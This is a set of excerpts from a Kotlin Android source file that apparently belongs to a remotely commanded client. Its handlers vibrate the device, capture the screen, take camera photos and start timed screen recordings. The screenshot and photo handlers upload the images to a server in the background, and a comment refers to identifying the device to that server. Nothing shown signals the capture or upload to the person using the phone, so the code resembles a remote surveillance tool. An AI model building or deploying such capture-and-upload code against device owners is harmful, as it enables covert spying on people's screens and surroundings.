   109→   109→    fun vibrate(context: Context, params: Map<String, Any>): String {
   110→   110→        return try {
   111→   111→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
   112→   112→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
   113→   113→            
   114→   114→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
   115→   115→            val pattern = params["pattern"] as? List<Long>
   116→   116→            
   117→   117→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
   118→   118→                val effect = if (pattern != null && pattern.isNotEmpty()) {
   119→   119→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
   120→   120→                } else {
   121→   121→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
   122→   122→                }
   123→   123→                vibrator.vibrate(effect)
   124→   124→            } else {
   125→   125→                @Suppress("DEPRECATION")
   126→   126→                if (pattern != null && pattern.isNotEmpty()) {
   127→   127→                    vibrator.vibrate(pattern.toLongArray(), -1)
   128→   128→                } else {
   129→   129→                    vibrator.vibrate(duration)
   130→   130→                }
   131→   131→            }
   132→   132→            "Vibrating for ${duration}ms"
   133→   133→        } catch (e: Exception) {
   134→   134→            Log.e(TAG, "Vibrate error", e)
   135→   135→            "Error: ${e.message}"
   136→   136→        }
   137→   137→    }

   197→   197→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
   198→   198→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
   199→   199→        val latch = CountDownLatch(1)
   200→   200→        var resultBitmap: Bitmap? = null
   201→   201→        var error: String? = null
   202→   202→        
   203→   203→        try {
   204→   204→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   205→   205→            val projection = mpm.getMediaProjection(resultCode, data)
   206→   206→            
   207→   207→            if (projection == null) {
   208→   208→                return mapOf("error" to "Failed to create media projection")
   209→   209→            }
   210→   210→            
   211→   211→            val metrics = context.resources.displayMetrics
   212→   212→            val width = metrics.widthPixels
   213→   213→            val height = metrics.heightPixels
   214→   214→            val density = metrics.densityDpi
   215→   215→            
   216→   216→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
   217→   217→            
   218→   218→            val virtualDisplay = projection.createVirtualDisplay(
   219→   219→                "ScreenCapture",
   220→   220→                width, height, density,
   221→   221→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   222→   222→                imageReader.surface, null, null
   223→   223→            )
   224→   224→            
   225→   225→            imageReader.setOnImageAvailableListener({ reader ->
   226→   226→                try {
   227→   227→                    val image = reader.acquireLatestImage()
   228→   228→                    if (image != null) {
   229→   229→                        val planes = image.planes
   230→   230→                        val buffer = planes[0].buffer
   231→   231→                        val bytes = ByteArray(buffer.remaining())
   232→   232→                        buffer.get(bytes)
   233→   233→                        
   234→   234→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   235→   235→                        if (bitmap != null) {
   236→   236→                            resultBitmap = bitmap
   237→   237→                        }
   238→   238→                        image.close()
   239→   239→                        latch.countDown()
   240→   240→                    }
   241→   241→                } catch (e: Exception) {
   242→   242→                    error = e.message
   243→   243→                    latch.countDown()
   244→   244→                }
   245→   245→            }, Handler(context.mainLooper))
   246→   246→            
   247→   247→            // Wait for capture
   248→   248→            latch.await(5, TimeUnit.SECONDS)
   249→   249→            
   250→   250→            // Cleanup
   251→   251→            virtualDisplay?.release()
   252→   252→            imageReader?.close()
   253→   253→            projection.stop()
   254→   254→            
   255→   255→            if (resultBitmap != null) {
   256→   256→                // Convert to base64
   257→   257→                val stream = ByteArrayOutputStream()
   258→   258→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   259→   259→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   260→   260→                
   261→   261→                // Save to file
   262→   262→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
   263→   263→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
   264→   264→                
   265→   265→                // Upload to server (file will be cached for streaming viewer)
   266→   266→                CoroutineScope(Dispatchers.IO).launch {
   267→   267→                    try {
   268→   268→                        ApiClient.uploadFile(file, "screenshot")
   269→   269→                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   270→   270→                }
   271→   271→                
   272→   272→                // Return full base64 for streaming viewer (server caches this)
   273→   273→                return mapOf(
   274→   274→                    "status" to "success",
   275→   275→                    "message" to "Screenshot captured",
   276→   276→                    "width" to resultBitmap!!.width,
   277→   277→                    "height" to resultBitmap!!.height,
   278→   278→                    "size" to stream.size(),
   279→   279→                    "file" to file.name,
   280→   280→                    "base64_preview" to base64
   281→   281→                )
   282→   282→            } else {
   283→   283→                return mapOf("error" to (error ?: "Failed to capture screen"))
   284→   284→            }
   285→   285→        } catch (e: Exception) {
   286→   286→            Log.e(TAG, "Screen capture error", e)
   287→   287→            return mapOf("error" to (e.message ?: "Unknown error"))
   288→   288→        }
   289→   289→    }

   300→   300→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
   301→   301→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
   302→   302→            return mapOf("error" to "Camera2 requires Android 5.0+")
   303→   303→        }
   304→   304→        
   305→   305→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
   306→   306→            return mapOf(
   307→   307→                "error" to "Camera permission not granted",
   308→   308→                "permission_required" to "android.permission.CAMERA"
   309→   309→            )
   310→   310→        }
   311→   311→        
   312→   312→        val latch = CountDownLatch(1)
   313→   313→        var resultBitmap: Bitmap? = null
   314→   314→        var errorMessage: String? = null
   315→   315→        
   316→   316→        try {
   317→   317→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
   318→   318→            var cameraId: String? = null
   319→   319→            
   320→   320→            // Find camera with correct facing
   321→   321→            for (id in manager.cameraIdList) {
   322→   322→                val characteristics = manager.getCameraCharacteristics(id)
   323→   323→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
   324→   324→                if (lensFacing == facing) {
   325→   325→                    cameraId = id
   326→   326→                    break
   327→   327→                }
   328→   328→            }
   329→   329→            
   330→   330→            if (cameraId == null) {
   331→   331→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
   332→   332→            }
   333→   333→            
   334→   334→            // Setup handler thread
   335→   335→            val thread = HandlerThread("CameraThread").apply { start() }
   336→   336→            val handler = Handler(thread.looper)
   337→   337→            
   338→   338→            // Get optimal size
   339→   339→            val characteristics = manager.getCameraCharacteristics(cameraId)
   340→   340→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
   341→   341→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
   342→   342→            val size = sizes?.maxByOrNull { it.width * it.height }
   343→   343→                ?: return mapOf("error" to "No supported JPEG sizes")
   344→   344→            
   345→   345→            // Create image reader
   346→   346→            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
   347→   347→            
   348→   348→            reader.setOnImageAvailableListener({ imageReader ->
   349→   349→                try {
   350→   350→                    val image = imageReader.acquireLatestImage()
   351→   351→                    if (image != null) {
   352→   352→                        val buffer = image.planes[0].buffer
   353→   353→                        val bytes = ByteArray(buffer.remaining())
   354→   354→                        buffer.get(bytes)
   355→   355→                        
   356→   356→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   357→   357→                        resultBitmap = bitmap
   358→   358→                        
   359→   359→                        // Save to file
   360→   360→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
   361→   361→                        FileOutputStream(file).use { it.write(bytes) }
   362→   362→                        
   363→   363→                        // Upload in background (with device_id for server identification)
   364→   364→                        CoroutineScope(Dispatchers.IO).launch {
   365→   365→                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   366→   366→                        }
   367→   367→                        
   368→   368→                        image.close()
   369→   369→                    }
   370→   370→                } catch (e: Exception) {
   371→   371→                    errorMessage = e.message
   372→   372→                }
   373→   373→                latch.countDown()
   374→   374→            }, handler)
   375→   375→            
   376→   376→            // Open camera
   377→   377→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
   378→   378→                override fun onOpened(camera: CameraDevice) {
   379→   379→                    try {
   380→   380→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
   381→   381→                        captureRequest.addTarget(reader.surface)
   382→   382→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
   383→   383→                        
   384→   384→                        camera.createCaptureSession(
   385→   385→                            listOf(reader.surface),
   386→   386→                            object : CameraCaptureSession.StateCallback() {
   387→   387→                                override fun onConfigured(session: CameraCaptureSession) {
   388→   388→                                    session.capture(captureRequest.build(), null, handler)
   389→   389→                                    
   390→   390→                                    // Close after capture
   391→   391→                                    handler.postDelayed({
   392→   392→                                        camera.close()
   393→   393→                                        reader.close()
   394→   394→                                        thread.quitSafely()
   395→   395→                                    }, 2000)
   396→   396→                                }
   397→   397→                                
   398→   398→                                override fun onConfigureFailed(session: CameraCaptureSession) {
   399→   399→                                    errorMessage = "Session configuration failed"
   400→   400→                                    latch.countDown()
   401→   401→                                }
   402→   402→                            },
   403→   403→                            handler
   404→   404→                        )
   405→   405→                    } catch (e: Exception) {
   406→   406→                        errorMessage = e.message
   407→   407→                        latch.countDown()
   408→   408→                    }
   409→   409→                }
   410→   410→                
   411→   411→                override fun onDisconnected(camera: CameraDevice) {
   412→   412→                    camera.close()
   413→   413→                }
   414→   414→                
   415→   415→                override fun onError(camera: CameraDevice, error: Int) {
   416→   416→                    errorMessage = "Camera error: $error"
   417→   417→                    camera.close()
   418→   418→                    latch.countDown()
   419→   419→                }
   420→   420→            }, handler)
   421→   421→            
   422→   422→            // Wait for result
   423→   423→            val success = latch.await(10, TimeUnit.SECONDS)
   424→   424→            
   425→   425→            if (resultBitmap != null) {
   426→   426→                val stream = ByteArrayOutputStream()
   427→   427→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   428→   428→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   429→   429→                
   430→   430→                return mapOf(
   431→   431→                    "status" to "success",
   432→   432→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
   433→   433→                    "width" to resultBitmap!!.width,
   434→   434→                    "height" to resultBitmap!!.height,
   435→   435→                    "size" to stream.size(),
   436→   436→                    "base64_preview" to base64
   437→   437→                )
   438→   438→            } else {
   439→   439→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
   440→   440→            }
   441→   441→        } catch (e: Exception) {
   442→   442→            Log.e(TAG, "Camera capture error", e)
   443→   443→            return mapOf("error" to (e.message ?: "Camera capture failed"))
   444→   444→        }
   445→   445→    }

   474→   474→                @Suppress("DEPRECATION")

   565→   565→        if (isRecordingScreen) {
   566→   566→            return mapOf("error" to "Already recording screen")
   567→   567→        }
   568→   568→        
   569→   569→        val resultCode = ScreenCaptureService.lastResultCode
   570→   570→        val data = ScreenCaptureService.lastPermissionData
   571→   571→        
   572→   572→        if (resultCode == 0 || data == null) {
   573→   573→            return mapOf(
   574→   574→                "error" to "Screen capture permission not granted",
   575→   575→                "action" to "request_screen_capture"
   576→   576→            )
   577→   577→        }
   578→   578→        
   579→   579→        return try {
   580→   580→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   581→   581→            val metrics = context.resources.displayMetrics
   582→   582→            val width = metrics.widthPixels
   583→   583→            val height = metrics.heightPixels
   584→   584→            val density = metrics.densityDpi
   585→   585→            
   586→   586→            val videoFile = File(context.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
   587→   587→            screenRecordFile = videoFile
   588→   588→            
   589→   589→            // Create media projection
   590→   590→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   591→   591→            val projection = mpm.getMediaProjection(resultCode, data)
   592→   592→            mediaProjection = projection
   593→   593→

   595→   595→            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {

   605→   605→                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
   606→   606→                setVideoSize(width, height)
   607→   607→                setVideoFrameRate(30)
   608→   608→                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
   609→   609→                setOutputFile(videoFile.absolutePath)
   610→   610→                prepare()
   611→   611→            }
   612→   612→            
   613→   613→            // Create virtual display
   614→   614→            virtualDisplay = projection?.createVirtualDisplay(
   615→   615→                "ScreenRecord",

   619→   619→            )
   620→   620→            
   621→   621→            screenRecorder?.start()
   622→   622→            isRecordingScreen = true
   623→   623→            
   624→   624→            // Auto-stop after duration

   626→   626→                kotlinx.coroutines.delay(duration * 1000L)
   627→   627→                if (isRecordingScreen) {
   628→   628→                    stopScreenRecording(context)

   633→   633→                "status" to "recording",
   634→   634→                "message" to "Screen recording started",
   635→   635→                "duration_seconds" to duration,
   636→   636→                "resolution" to "${width}x${height}",
   637→   637→                "file" to videoFile.name
   638→   638→            )
   639→   639→        } catch (e: Exception) {
   640→   640→            Log.e(TAG, "Screen recording start error", e)
